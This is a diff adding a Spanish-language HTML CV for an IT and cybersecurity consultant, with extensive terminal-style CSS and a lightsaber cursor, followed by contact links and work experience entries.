@@ -1,4 +1,1418 @@
-<div id="cyber-wolf-ultimate">
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MARÍA JESÚS MARTÍNEZ LEO | CIBERSEGURIDAD & SISTEMAS</title>
+  <style>
+    /* --- LIGHTSABER CURSOR --- */
+    @media (hover: hover) and (pointer: fine) {
+      body { cursor: none !important; }
+      a, button, .contact a, .exp-company a, .edu-school a, .audio-btn, .cert-item, .skill-cat, .exp-item, .edu-item { cursor: none !important; }
+      
+      /* Contenedor principal del sable */
+      .lightsaber-cursor {
+        position: fixed;
+        top: 0;
+        left: 0;
+        pointer-events: none;
+        z-index: 99999;
+        transition: all 0.12s ease-out;
+      }
+      
+      /* === SABRE VERDE (NORMAL) === */
+      .lightsaber-cursor.green {
+        width: 6px;
+        height: 55px;
+        transform: translate(-40%, -8%) rotate(-45deg);
+        transform-origin: 70% 90%;
+        filter: drop-shadow(0 0 8px rgba(0,255,65,0.8)) drop-shadow(0 0 16px rgba(0,255,65,0.6)) drop-shadow(0 0 24px rgba(0,255,65,0.4));
+      }
+      
+      .lightsaber-cursor.green .lightsaber-blade {
+        width: 100%;
+        height: 78%;
+        background: linear-gradient(
+          to bottom,
+          #ffffff 0%,
+          #ddffdd 8%,
+          #00ff41 18%,
+          #00ff41 72%,
+          #008f11 100%
+        );
+        border-radius: 3px 3px 1px 1px;
+        position: relative;
+        box-shadow: 
+          0 0 15px rgba(0,255,65,0.9),
+          0 0 28px rgba(0,255,65,0.7),
+          0 0 42px rgba(0,255,65,0.5),
+          inset 0 0 12px rgba(255,255,255,0.5),
+          inset 0 0 20px rgba(255,255,255,0.3);
+      }
+      
+      .lightsaber-cursor.green .lightsaber-blade::before {
+        content: "";
+        position: absolute;
+        top: -7px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 10px;
+        height: 10px;
+        background: radial-gradient(circle, #ffffff 0%, #00ff41 35%, transparent 100%);
+        border-radius: 50%;
+        box-shadow: 
+          0 0 20px rgba(0,255,65,0.9),
+          0 0 40px rgba(0,255,65,0.8),
+          0 0 60px rgba(0,255,65,0.6);
+        animation: bladeTipPulse 0.7s ease-in-out infinite;
+      }
+      
+      .lightsaber-cursor.green .lightsaber-blade::after {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+          90deg,
+          transparent 0%,
+          rgba(255,255,255,0.6) 25%,
+          rgba(255,255,255,0.6) 75%,
+          transparent 100%
+        );
+        border-radius: 3px 3px 1px 1px;
+        animation: bladeEnergyFlow 1.8s ease-in-out infinite;
+      }
+      
+      .lightsaber-cursor.green .lightsaber-handle {
+        position: absolute;
+        bottom: -22px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 8px;
+        height: 26px;
+        background: linear-gradient(180deg, 
+          #999 0%, 
+          #666 25%, 
+          #444 50%, 
+          #222 75%, 
+          #111 100%);
+        border: 1px solid #008f11;
+        border-radius: 2px;
+        box-shadow: 
+          0 0 12px rgba(0,0,0,0.9),
+          inset 0 0 6px rgba(255,255,255,0.2);
+      }
+      
+      .lightsaber-cursor.green .lightsaber-handle::before {
+        content: "";
+        position: absolute;
+        top: 4px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 12px;
+        height: 3px;
+        background: linear-gradient(90deg, #444, #777, #444);
+        border-radius: 1px;
+        border: 1px solid #222;
+        box-shadow: 0 0 4px rgba(0,0,0,0.6);
+      }
+      
+      .lightsaber-cursor.green .lightsaber-handle::after {
+        content: "";
+        position: absolute;
+        bottom: 4px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 12px;
+        height: 3px;
+        background: linear-gradient(90deg, #444, #777, #444);
+        border-radius: 1px;
+        border: 1px solid #222;
+        box-shadow: 0 0 4px rgba(0,0,0,0.6);
+      }
+      
+      .lightsaber-cursor.green .lightsaber-glow {
+        position: absolute;
+        top: 32%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 22px;
+        height: 22px;
+        background: radial-gradient(circle, rgba(0,255,65,0.7) 0%, rgba(0,255,65,0.4) 45%, transparent 75%);
+        border-radius: 50%;
+        animation: lightsaberPulse 1.2s ease-in-out infinite;
+        filter: blur(3px);
+      }
+      
+      .lightsaber-cursor.green .lightsaber-trail {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(to bottom, rgba(0,255,65,0.5) 0%, transparent 100%);
+        filter: blur(5px);
+        opacity: 0.75;
+        animation: trailFlicker 0.25s ease-in-out infinite;
+      }
+      
+      /* === SABRE AZUL (LINKS) === */
+      .lightsaber-cursor.blue {
+        width: 6px;
+        height: 55px;
+        transform: translate(-40%, -8%) rotate(-45deg);
+        transform-origin: 70% 90%;
+        filter: drop-shadow(0 0 10px rgba(0,150,255,0.9)) drop-shadow(0 0 20px rgba(0,150,255,0.7)) drop-shadow(0 0 30px rgba(0,150,255,0.5));
+      }
+      
+      .lightsaber-cursor.blue .lightsaber-blade {
+        width: 100%;
+        height: 78%;
+        background: linear-gradient(
+          to bottom,
+          #ffffff 0%,
+          #ddeeff 8%,
+          #0096ff 18%,
+          #0096ff 72%,
+          #004d99 100%
+        );
+        border-radius: 3px 3px 1px 1px;
+        position: relative;
+        box-shadow: 
+          0 0 18px rgba(0,150,255,0.9),
+          0 0 32px rgba(0,150,255,0.7),
+          0 0 48px rgba(0,150,255,0.5),
+          inset 0 0 12px rgba(255,255,255,0.5),
+          inset 0 0 20px rgba(255,255,255,0.3);
+      }
+      
+      .lightsaber-cursor.blue .lightsaber-blade::before {
+        content: "";
+        position: absolute;
+        top: -7px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 10px;
+        height: 10px;
+        background: radial-gradient(circle, #ffffff 0%, #0096ff 35%, transparent 100%);
+        border-radius: 50%;
+        box-shadow: 
+          0 0 24px rgba(0,150,255,0.9),
+          0 0 48px rgba(0,150,255,0.8),
+          0 0 72px rgba(0,150,255,0.6);
+        animation: bladeTipPulse 0.6s ease-in-out infinite;
+      }
+      
+      .lightsaber-cursor.blue .lightsaber-blade::after {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+          90deg,
+          transparent 0%,
+          rgba(255,255,255,0.6) 25%,
+          rgba(255,255,255,0.6) 75%,
+          transparent 100%
+        );
+        border-radius: 3px 3px 1px 1px;
+        animation: bladeEnergyFlow 1.5s ease-in-out infinite;
+      }
+      
+      .lightsaber-cursor.blue .lightsaber-handle {
+        position: absolute;
+        bottom: -22px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 8px;
+        height: 26px;
+        background: linear-gradient(180deg, 
+          #111 0%, 
+          #222 25%, 
+          #444 50%, 
+          #666 75%, 
+          #888 100%);
+        border: 1px solid #004d99;
+        border-radius: 2px;
+        box-shadow: 
+          0 0 12px rgba(0,0,0,0.9),
+          inset 0 0 6px rgba(255,255,255,0.2);
+      }
+      
+      .lightsaber-cursor.blue .lightsaber-handle::before {
+        content: "";
+        position: absolute;
+        top: 4px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 12px;
+        height: 3px;
+        background: linear-gradient(90deg, #444, #777, #444);
+        border-radius: 1px;
+        border: 1px solid #222;
+        box-shadow: 0 0 4px rgba(0,0,0,0.6);
+      }
+      
+      .lightsaber-cursor.blue .lightsaber-handle::after {
+        content: "";
+        position: absolute;
+        bottom: 4px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 12px;
+        height: 3px;
+        background: linear-gradient(90deg, #444, #777, #444);
+        border-radius: 1px;
+        border: 1px solid #222;
+        box-shadow: 0 0 4px rgba(0,0,0,0.6);
+      }
+      
+      .lightsaber-cursor.blue .lightsaber-glow {
+        position: absolute;
+        top: 32%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 24px;
+        height: 24px;
+        background: radial-gradient(circle, rgba(0,150,255,0.8) 0%, rgba(0,150,255,0.5) 45%, transparent 75%);
+        border-radius: 50%;
+        animation: lightsaberPulse 1s ease-in-out infinite;
+        filter: blur(3px);
+      }
+      
+      .lightsaber-cursor.blue .lightsaber-trail {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(to bottom, rgba(0,150,255,0.6) 0%, transparent 100%);
+        filter: blur(5px);
+        opacity: 0.8;
+        animation: trailFlicker 0.2s ease-in-out infinite;
+      }
+      
+      /* Animaciones */
+      @keyframes bladeTipPulse {
+        0%, 100% { 
+          opacity: 1; 
+          transform: translateX(-50%) scale(1);
+        }
+        50% { 
+          opacity: 0.88; 
+          transform: translateX(-50%) scale(1.12);
+        }
+      }
+      
+      @keyframes bladeEnergyFlow {
+        0%, 100% { opacity: 0.5; }
+        50% { opacity: 0.75; }
+      }
+      
+      @keyframes lightsaberPulse {
+        0%, 100% { opacity: 0.65; transform: translate(-50%, -50%) scale(1); }
+        50% { opacity: 1; transform: translate(-50%, -50%) scale(1.18); }
+      }
+      
+      @keyframes trailFlicker {
+        0%, 100% { opacity: 0.65; }
+        50% { opacity: 0.9; }
+      }
+    }
+    
+    @media print {
+      .lightsaber-cursor { display: none !important; }
+    }
+
+    .audio-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      background: linear-gradient(180deg, var(--surface-alt) 0%, var(--surface) 100%);
+      border: 1px solid var(--primary);
+      color: var(--primary);
+      padding: 0.3rem 0.7rem;
+      font-size: 0.75rem;
+      cursor: none !important;
+      transition: all 0.25s ease;
+      text-shadow: 0 0 5px var(--primary-glow);
+      margin-top: 0.5rem;
+    }
+    .audio-btn:hover {
+      background: linear-gradient(180deg, rgba(0,40,0,0.6) 0%, rgba(0,20,0,0.3) 100%);
+      box-shadow: 0 0 15px rgba(0,255,65,0.3);
+      color: var(--text);
+      animation: pulse 1.5s infinite;
+    }
+    .audio-hidden {
+      position: fixed;
+      top: -9999px;
+      left: -9999px;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+    }
+    @media print {
+      .audio-btn, .audio-hidden { display: none !important; }
+    }
+
+    :root {
+      --bg: #000000;
+      --bg-alt: #050505;
+      --surface: #0a0a0a;
+      --surface-alt: #0f0f0f;
+      --border: #1a1a1a;
+      --border-light: #2a2a2a;
+      --primary: #00ff41;
+      --primary-dim: #00cc33;
+      --primary-dark: #008f11;
+      --primary-glow: rgba(0, 255, 65, 0.5);
+      --text: #ffffff;
+      --text-muted: #a0a0a0;
+      --text-dim: #5a5a5a;
+    }
+    
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    
+    body {
+      font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.5;
+      padding: 2rem;
+      max-width: 1000px;
+      margin: 0 auto;
+      font-size: 11px;
+      position: relative;
+    }
+    
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: 
+        radial-gradient(ellipse at 50% 0%, rgba(0,40,0,0.4) 0%, transparent 60%),
+        repeating-linear-gradient(0deg, rgba(0,20,0,0.03) 0px, rgba(0,20,0,0.03) 1px, transparent 1px, transparent 3px);
+      pointer-events: none;
+      z-index: -1;
+    }
+    
+    body::after {
+      content: "";
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: repeating-linear-gradient(
+        0deg,
+        rgba(0, 0, 0, 0.3) 0px,
+        rgba(0, 0, 0, 0.3) 1px,
+        transparent 1px,
+        transparent 2px
+      );
+      pointer-events: none;
+      z-index: 9998;
+      opacity: 0.7;
+    }
+    
+    @keyframes cursor {
+      0%, 50% { border-right-color: var(--primary); }
+      51%, 100% { border-right-color: transparent; }
+    }
+    
+    @keyframes glitch {
+      0% { transform: translate(0); }
+      20% { transform: translate(-2px, 2px); }
+      40% { transform: translate(-2px, -2px); }
+      60% { transform: translate(2px, 2px); }
+      80% { transform: translate(2px, -2px); }
+      100% { transform: translate(0); }
+    }
+    
+    @keyframes textGlow {
+      0%, 100% { text-shadow: 0 0 8px var(--primary-glow), 0 0 15px var(--primary-glow); }
+      50% { text-shadow: 0 0 15px var(--primary-glow), 0 0 30px var(--primary-glow), 0 0 45px var(--primary-glow); }
+    }
+    
+    @keyframes blink {
+      0%, 49% { opacity: 1; }
+      50%, 100% { opacity: 0.3; }
+    }
+    
+    @keyframes pulse {
+      0%, 100% { opacity: 1; box-shadow: 0 0 5px var(--primary-glow); }
+      50% { opacity: 0.6; box-shadow: 0 0 15px var(--primary-glow); }
+    }
+    
+    @keyframes borderFlow {
+      0% { border-color: var(--primary-dark); }
+      50% { border-color: var(--primary); }
+      100% { border-color: var(--primary-dark); }
+    }
+    
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateX(-10px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+    
+    header {
+      border: 1px solid var(--primary);
+      border-bottom: 3px solid var(--primary);
+      padding: 1.2rem 1.5rem;
+      margin-bottom: 2rem;
+      position: relative;
+      background: linear-gradient(180deg, rgba(0,40,0,0.2) 0%, rgba(0,20,0,0.05) 100%);
+      box-shadow: 0 0 30px rgba(0,255,65,0.15), inset 0 0 30px rgba(0,255,65,0.05);
+      animation: borderFlow 4s ease-in-out infinite;
+    }
+    
+    header::before {
+      content: "root@zyanetralys:~/cv# ";
+      position: absolute;
+      top: -9px;
+      left: 15px;
+      font-size: 0.75rem;
+      color: var(--primary);
+      background: var(--bg);
+      padding: 0 6px;
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    header::after {
+      content: "● [ONLINE]";
+      position: absolute;
+      right: 15px;
+      top: -9px;
+      font-size: 0.75rem;
+      color: var(--primary);
+      animation: blink 1.2s infinite;
+      background: var(--bg);
+      padding: 0 6px;
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    h1 {
+      color: var(--text);
+      font-size: 1.5rem;
+      text-transform: uppercase;
+      letter-spacing: 4px;
+      margin-bottom: 0.7rem;
+      text-shadow: 0 0 10px var(--primary-glow), 0 0 20px var(--primary-glow);
+      animation: textGlow 3s ease-in-out infinite;
+      position: relative;
+      display: inline-block;
+    }
+    
+    h1::after {
+      content: "█";
+      animation: cursor 0.9s step-end infinite;
+      color: var(--primary);
+      margin-left: 4px;
+      text-shadow: 0 0 10px var(--primary-glow);
+    }
+    
+    .contact {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.9rem 1.4rem;
+      font-size: 0.82rem;
+      color: var(--text-muted);
+      border-top: 1px dashed var(--primary-dark);
+      padding-top: 0.9rem;
+      margin-top: 0.5rem;
+    }
+    
+    .contact a {
+      color: var(--primary-dim);
+      text-decoration: none;
+      border-bottom: 1px dotted var(--primary);
+      transition: all 0.25s ease;
+      position: relative;
+    }
+    
+    .contact a::before {
+      content: "[";
+      color: var(--primary);
+      margin-right: 2px;
+      opacity: 0.7;
+    }
+    
+    .contact a::after {
+      content: "]";
+      color: var(--primary);
+      margin-left: 2px;
+      opacity: 0.7;
+    }
+    
+    .contact a:hover {
+      color: var(--primary);
+      border-bottom-color: var(--primary);
+      text-shadow: 0 0 10px var(--primary-glow);
+      padding-left: 3px;
+    }
+    
+    section {
+      margin-bottom: 2rem;
+      position: relative;
+      animation: slideIn 0.5s ease-out;
+    }
+    
+    section::before {
+      content: "";
+      position: absolute;
+      left: -1.8rem;
+      top: 0.5rem;
+      width: 3px;
+      height: calc(100% + 1.5rem);
+      background: linear-gradient(180deg, var(--primary) 0%, var(--primary-dark) 50%, transparent 100%);
+      opacity: 0.4;
+      box-shadow: 0 0 10px var(--primary-glow);
+    }
+    
+    h2 {
+      color: var(--text);
+      font-size: 0.95rem;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      border-left: 4px solid var(--primary);
+      padding-left: 1rem;
+      margin-bottom: 1.2rem;
+      background: linear-gradient(90deg, rgba(0,40,0,0.5) 0%, rgba(0,20,0,0.1) 60%, transparent 100%);
+      padding: 0.5rem 1rem;
+      position: relative;
+      display: inline-block;
+      box-shadow: 0 0 15px rgba(0,255,65,0.2);
+    }
+    
+    h2::before {
+      content: "$ ";
+      color: var(--primary);
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    h2:hover {
+      animation: glitch 0.3s ease;
+      color: var(--primary);
+    }
+    
+    .exp-item {
+      margin-bottom: 1.4rem;
+      padding-left: 1.3rem;
+      border-left: 1px dotted var(--border-light);
+      position: relative;
+      transition: all 0.3s ease;
+      background: linear-gradient(90deg, rgba(0,30,0,0.1) 0%, transparent 100%);
+    }
+    
+    .exp-item:hover {
+      border-left-color: var(--primary);
+      border-left-style: solid;
+      background: linear-gradient(90deg, rgba(0,40,0,0.25) 0%, transparent 100%);
+      padding-left: 1.5rem;
+    }
+    
+    .exp-item::before {
+      content: ">";
+      position: absolute;
+      left: -5px;
+      top: 3px;
+      color: var(--primary);
+      font-size: 0.7rem;
+      animation: pulse 2s infinite;
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    .exp-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      margin-bottom: 0.4rem;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+    }
+    
+    .exp-title {
+      color: var(--text);
+      font-weight: 700;
+      font-size: 0.92rem;
+      text-shadow: 0 0 5px rgba(255,255,255,0.3);
+    }
+    
+    .exp-company {
+      color: var(--primary-dim);
+      font-size: 0.84rem;
+    }
+    
+    .exp-company a {
+      color: var(--primary-dim);
+      text-decoration: none;
+      border-bottom: 1px dotted var(--primary);
+      transition: all 0.25s ease;
+    }
+    
+    .exp-company a:hover {
+      color: var(--primary);
+      border-bottom-color: var(--primary);
+      text-shadow: 0 0 10px var(--primary-glow);
+    }
+    
+    .exp-date {
+      color: var(--text-dim);
+      font-size: 0.8rem;
+      font-style: italic;
+    }
+    
+    .exp-date::before { content: "[ "; color: var(--primary-dark); }
+    .exp-date::after { content: " ]"; color: var(--primary-dark); }
+    
+    .exp-details {
+      list-style: none;
+      margin-top: 0.5rem;
+    }
+    
+    .exp-details li {
+      padding-left: 1.2rem;
+      margin-bottom: 0.25rem;
+      color: var(--text-muted);
+      font-size: 0.85rem;
+      position: relative;
+      transition: all 0.2s ease;
+    }
+    
+    .exp-details li::before {
+      content: "▸";
+      position: absolute;
+      left: 0;
+      color: var(--primary);
+      font-weight: bold;
+      text-shadow: 0 0 5px var(--primary-glow);
+    }
+    
+    .exp-details li:hover {
+      color: var(--text);
+      padding-left: 1.4rem;
+    }
+    
+    .skills-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 0.8rem;
+    }
+    
+    .skill-cat {
+      background: linear-gradient(180deg, var(--surface) 0%, var(--surface-alt) 100%);
+      border: 1px solid var(--border);
+      border-left: 3px solid var(--primary);
+      padding: 0.85rem;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .skill-cat::before {
+      content: "";
+      position: absolute;
+      top: 0; left: -100%;
+      width: 100%; height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(0,255,65,0.08), transparent);
+      transition: left 0.5s ease;
+    }
+    
+    .skill-cat:hover::before {
+      left: 100%;
+    }
+    
+    .skill-cat:hover {
+      border-color: var(--primary);
+      border-left-color: var(--primary);
+      box-shadow: 0 0 20px rgba(0,255,65,0.25), inset 0 0 20px rgba(0,255,65,0.05);
+      transform: translateX(4px);
+    }
+    
+    .skill-cat h3 {
+      color: var(--primary);
+      font-size: 0.85rem;
+      margin-bottom: 0.5rem;
+      border-bottom: 1px dashed var(--border-light);
+      padding-bottom: 0.4rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    .skill-list {
+      list-style: none;
+      font-size: 0.8rem;
+      color: var(--text-muted);
+    }
+    
+    .skill-list li {
+      margin-bottom: 0.2rem;
+      padding-left: 1rem;
+      position: relative;
+      transition: all 0.2s ease;
+    }
+    
+    .skill-list li::before {
+      content: ">";
+      position: absolute;
+      left: 0;
+      color: var(--primary);
+      text-shadow: 0 0 5px var(--primary-glow);
+    }
+    
+    .skill-list li:hover {
+      color: var(--primary);
+      padding-left: 1.3rem;
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    .edu-item {
+      margin-bottom: 0.65rem;
+      font-size: 0.84rem;
+      padding-left: 1rem;
+      border-left: 2px solid var(--border);
+      transition: all 0.25s ease;
+      background: linear-gradient(90deg, rgba(0,20,0,0.08) 0%, transparent 100%);
+    }
+    
+    .edu-item:hover {
+      border-left-color: var(--primary);
+      background: linear-gradient(90deg, rgba(0,40,0,0.2) 0%, transparent 100%);
+      padding-left: 1.2rem;
+    }
+    
+    .edu-title {
+      color: var(--text);
+      font-weight: 600;
+    }
+    
+    .edu-school {
+      color: var(--primary-dim);
+      font-size: 0.82rem;
+    }
+    
+    .edu-school a {
+      color: var(--primary-dim);
+      text-decoration: none;
+      border-bottom: 1px dotted var(--primary);
+      transition: all 0.25s ease;
+    }
+    
+    .edu-school a:hover {
+      color: var(--primary);
+      border-bottom-color: var(--primary);
+      text-shadow: 0 0 10px var(--primary-glow);
+    }
+    
+    .edu-date {
+      color: var(--text-dim);
+      font-size: 0.78rem;
+    }
+    
+    .cert-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+      gap: 0.3rem;
+      font-size: 0.75rem;
+      color: var(--text-muted);
+    }
+    
+    .cert-item {
+      background: linear-gradient(180deg, var(--surface-alt) 0%, var(--surface) 100%);
+      border: 1px solid var(--border);
+      border-radius: 2px;
+      padding: 0.4rem 0.6rem;
+      transition: all 0.2s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .cert-item::before {
+      content: "";
+      position: absolute;
+      top: 0; left: -100%;
+      width: 100%; height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(0,255,65,0.12), transparent);
+      transition: left 0.4s ease;
+    }
+    
+    .cert-item:hover {
+      border-color: var(--primary);
+      background: linear-gradient(180deg, rgba(0,40,0,0.5) 0%, rgba(0,20,0,0.3) 100%);
+      transform: translateX(4px);
+      box-shadow: 0 0 15px rgba(0,255,65,0.2);
+    }
+    
+    .cert-item:hover::before {
+      left: 100%;
+    }
+    
+    .cert-item strong {
+      color: var(--primary);
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    .cert-item:hover strong {
+      color: var(--text);
+    }
+    
+    .projects-list {
+      list-style: none;
+      font-size: 0.82rem;
+      color: var(--text-muted);
+    }
+    
+    .projects-list li {
+      margin-bottom: 0.35rem;
+      padding-left: 1.5rem;
+      position: relative;
+      transition: all 0.2s ease;
+    }
+    
+    .projects-list li::before {
+      content: "├─";
+      position: absolute;
+      left: 0;
+      color: var(--primary);
+      text-shadow: 0 0 5px var(--primary-glow);
+    }
+    
+    .projects-list li:last-child::before {
+      content: "└─";
+    }
+    
+    .projects-list li:hover {
+      color: var(--text);
+      padding-left: 1.7rem;
+    }
+    
+    .availability {
+      font-size: 0.82rem;
+      color: var(--text-muted);
+      background: linear-gradient(180deg, var(--surface) 0%, var(--surface-alt) 100%);
+      border: 1px solid var(--border);
+      border-left: 4px solid var(--primary);
+      padding: 0.9rem;
+      box-shadow: 0 0 20px rgba(0,255,65,0.1);
+    }
+    
+    .availability span {
+      color: var(--primary);
+      font-weight: 700;
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    .tag {
+      display: inline-block;
+      background: linear-gradient(180deg, var(--surface-alt) 0%, var(--surface) 100%);
+      border: 1px solid var(--primary);
+      color: var(--primary);
+      padding: 0.1rem 0.45rem;
+      font-size: 0.7rem;
+      margin-right: 0.3rem;
+      letter-spacing: 0.5px;
+      text-shadow: 0 0 5px var(--primary-glow);
+    }
+    
+    footer {
+      margin-top: 3rem;
+      padding-top: 1.2rem;
+      border-top: 1px solid var(--border);
+      font-size: 0.75rem;
+      color: var(--text-dim);
+      text-align: center;
+      position: relative;
+    }
+    
+    footer::before {
+      content: "════════════════════════════════════════════════";
+      display: block;
+      color: var(--primary);
+      margin-bottom: 0.6rem;
+      font-size: 0.65rem;
+      letter-spacing: 3px;
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    footer::after {
+      content: "[ Call me, beep me, if you wanna reach me ]";
+      display: block;
+      color: var(--primary);
+      margin-top: 0.4rem;
+      animation: blink 2s infinite;
+      text-shadow: 0 0 10px var(--primary-glow);
+      letter-spacing: 2px;
+    }
+    
+    .divider {
+      color: var(--primary);
+      font-size: 0.7rem;
+      text-align: center;
+      margin: 1.5rem 0;
+      letter-spacing: 4px;
+      opacity: 0.7;
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    .corner {
+      position: fixed;
+      width: 100px;
+      height: 100px;
+      border: 2px solid var(--primary);
+      opacity: 0.3;
+      pointer-events: none;
+      z-index: 9997;
+    }
+    
+    .corner-tl { top: 20px; left: 20px; border-right: none; border-bottom: none; }
+    .corner-tr { top: 20px; right: 20px; border-left: none; border-bottom: none; }
+    .corner-bl { bottom: 20px; left: 20px; border-right: none; border-top: none; }
+    .corner-br { bottom: 20px; right: 20px; border-left: none; border-top: none; }
+    
+    @media print {
+      body {
+        background: #fff;
+        color: #000;
+        padding: 1rem;
+        font-size: 10px;
+        font-family: 'Consolas', 'Courier New', monospace;
+      }
+      body::before, body::after { display: none; }
+      .corner { display: none; }
+      header::before, header::after { display: none; }
+      h1 { color: #000; text-shadow: none; animation: none; }
+      h1::after { display: none; }
+      h2 { color: #000; border-left-color: #000; background: none; box-shadow: none; }
+      h2::before { content: ""; }
+      .exp-title { color: #000; }
+      .exp-company, .exp-company a, .edu-school, .edu-school a { color: #333; }
+      .exp-details li, .skill-list li, .cert-item, .projects-list li { color: #444; }
+      .exp-details li::before, .skill-list li::before, .projects-list li::before { color: #000; }
+      .skill-cat, .cert-item, .availability { background: #f5f5f5; border-color: #ccc; box-shadow: none; }
+      .cert-item strong, .tag { color: #000; border-color: #000; text-shadow: none; }
+      a { color: #000; text-decoration: none; border: none; }
+      footer::before, footer::after { content: ""; }
+      .divider { display: none; }
+      section::before { display: none; }
+      .exp-item:hover, .edu-item:hover, .skill-cat:hover, .cert-item:hover {
+        transform: none; box-shadow: none; background: #f5f5f5; padding-left: 1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<!-- LIGHTSABER CURSOR -->
+<div class="lightsaber-cursor green" id="lightsaber">
+  <div class="lightsaber-trail"></div>
+  <div class="lightsaber-glow"></div>
+  <div class="lightsaber-blade"></div>
+  <div class="lightsaber-handle"></div>
+</div>
+
+<div class="corner corner-tl"></div>
+<div class="corner corner-tr"></div>
+<div class="corner corner-bl"></div>
+<div class="corner corner-br"></div>
+
+<header>
+  <h1>MARÍA JESÚS MARTÍNEZ LEO</h1>
+  <div class="contact">
+    <span>Madrid / Cádiz, España</span>
+    <span>•</span>
+    <a href="https://www.linkedin.com/in/mjmal/" target="_blank">linkedin.com/in/mjmal</a>
+    <span>•</span>
+    <a href="https://github.com/Zyanetralys" target="_blank">github.com/Zyanetralys</a>
+    <span>•</span>
+    <span>Inglés: Nivel C1 (Avanzado)</span>
+    <span>•</span>
+    <span>Carnet de conducir: B y A2</span>
+  </div>
+</header>
+
+<section>
+  <h2>EXPERIENCIA TÉCNICA</h2>
+  
+  <div class="exp-item">
+    <div class="exp-header">
+      <div>
+        <div class="exp-title">Consultora Especialista IT</div>
+        <div class="exp-company"><a href="https://www.alvatross.io/" target="_blank">Alvatross</a> | Telecomunicaciones</div>
+      </div>
+      <div class="exp-date">FEB 2026–ACT</div>
+    </div>
+    <ul class="exp-details">
+      <li>Colaboración con equipos DevOps, desarrollo y sistemas en entornos OSS/BSS.</li>
+      <li>Validación técnica de stacks, arquitecturas y competencias.</li>
+      <li>Definición de requisitos técnicos y documentación en Confluence.</li>
+      <li>Soporte a proyectos IT y coordinación con áreas de sistemas.</li>
+    </ul>
+  </div>
+
+  <div class="exp-item">
+    <div class="exp-header">
+      <div>
+        <div class="exp-title">Consultora Especialista IT</div>
+        <div class="exp-company"><a href="https://www.atm-maggioli.es/" target="_blank">ATM Grupo Maggioli</a> | Admin. Pública</div>
+      </div>
+      <div class="exp-date">FEB 2023– FEB 2026</div>
+    </div>
+    <ul class="exp-details">
+      <li>Análisis funcional y técnico de perfiles IT en entornos regulados.</li>
+      <li>Participación en implementación ISO 27001 y ENS.</li>
+      <li>Coordinación con equipos de ciberseguridad, datos e implantaciones.</li>
+      <li>Onboarding técnico y validación de competencias.</li>
+    </ul>
+  </div>
+
+  <div class="exp-item">
+    <div class="exp-header">
+      <div>
+        <div class="exp-title">Soporte Backend (Prácticas)</div>
+        <div class="exp-company"><a href="https://www.atm-maggioli.es/" target="_blank">ATM Grupo Maggioli</a></div>
+      </div>
+      <div class="exp-date">ENE–JUN 2025</div>
+    </div>
+    <ul class="exp-details">
+      <li>Scripts Python para automatización y mantenimiento.</li>
+      <li>Consultas SQL (PostgreSQL/MySQL) para extracción y validación de datos.</li>
+      <li>Soporte nivel 2, resolución de incidencias y documentación técnica.</li>
+    </ul>
+  </div>
+
+  <div class="exp-item">
+    <div class="exp-header">
+      <div>
+        <div class="exp-title">Analista de Ciberseguridad</div>
+        <div class="exp-company"><a href="" target="_blank">NoCountry</a> | Proyecto Fintech</div>
+      </div>
+      <div class="exp-date">SEP–DIC 2025</div>
+    </div>
+    <ul class="exp-details">
+      <li>Escaneo de vulnerabilidades web (OWASP ZAP) y análisis SAST.</li>
+      <li>Guías de cifrado, autenticación y protección de datos.</li>
+      <li>Automatización de tareas de seguridad con Python.</li>
+    </ul>
+  </div>
+
